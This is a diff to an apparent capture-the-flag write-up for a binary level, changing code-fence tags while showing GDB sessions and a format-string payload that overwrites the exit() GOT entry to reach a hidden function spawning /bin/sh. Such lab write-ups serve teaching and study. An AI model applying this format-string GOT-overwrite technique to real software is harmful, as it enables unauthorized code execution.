@@ -46,7 +46,7 @@ This section provides a detailed analysis of the assembly code for the three fun
 
 Before analyzing the main function, we inspect the full list of functions defined in the binary to identify hidden logic that isn't invoked explicitly:
 
-```bash
+```gdb
 (gdb) info functions
 0x080484a4  o
 0x080484c2  n
@@ -183,26 +183,26 @@ This section documents the dynamic analysis of the level5 binary using GDB. The 
 
 First, verify the GOT address of `exit()` and the address of the hidden `o()` function:
 
-```bash
+```gdb
 (gdb) info address exit
 Symbol "exit" is at 0x80483d0 in a file compiled without debugging.
 ```
 
 We want to overwrite the **GOT entry** for `exit()`, not the PLT stub. Use:
 
-```bash
+```gdb
 (gdb) info functions
 ```
 
 This reveals the address of `o()`:
 
-```bash
+```asm
 0x080484a4  o
 ```
 
 And we locate the GOT entry for `exit()`:
 
-```bash
+```gdb
 (gdb) x/wx 0x08049838
 0x8049838 <exit@got.plt>:       0x080483d6
 ```
@@ -215,7 +215,7 @@ We will aim to write `0x080484a4` into this location.
 
 Set a breakpoint at the `printf()` call to examine the stack:
 
-```bash
+```gdb
 (gdb) break *0x080484f3
 (gdb) run
 ```
@@ -232,7 +232,7 @@ AAAA
 
 Check the base pointer and stack memory:
 
-```bash
+```gdb
 (gdb) info registers
 eax            0xbffff520       -1073744608
 esp            0xbffff510       0xbffff510
@@ -244,14 +244,14 @@ ebp            0xbffff728       0xbffff728
 
 Look for the value `0x41414141` (our "AAAA") in memory. Then verify the buffer address:
 
-```bash
+```gdb
 (gdb) print $ebp - 0x208
 $1 = 0xbffff520
 ```
 
 The buffer location should align with what we see on the stack:
 
-```bash
+```gdb
 (gdb) x/4x 0xbffff520
 0xbffff520:     0x41414141      0xb7e2000a      0x00000001      0xb7fef305
 ```
@@ -289,14 +289,14 @@ python -c 'print("\x38\x98\x04\x08" + "%134513824d" + "%4$n")' > /tmp/exploit
 
 Place a breakpoint at `exit()` and `o()`:
 
-```bash
+```gdb
 (gdb) break *0x080484a4   # entry of o()
 (gdb) run < /tmp/exploit
 ```
 
 Check that the GOT has been overwritten:
 
-```bash
+```gdb
 (gdb) x/wx 0x08049838
 0x8049838 <exit@got.plt>:       0x080484a4
 ```
@@ -315,7 +315,7 @@ The function `o()` executes the following instruction:
 
 This means the string passed to `system()` is located at address `0x080485f0`. We can confirm it in GDB:
 
-```bash
+```gdb
 (gdb) x/s 0x080485f0
 0x80485f0:  "/bin/sh"
 ```
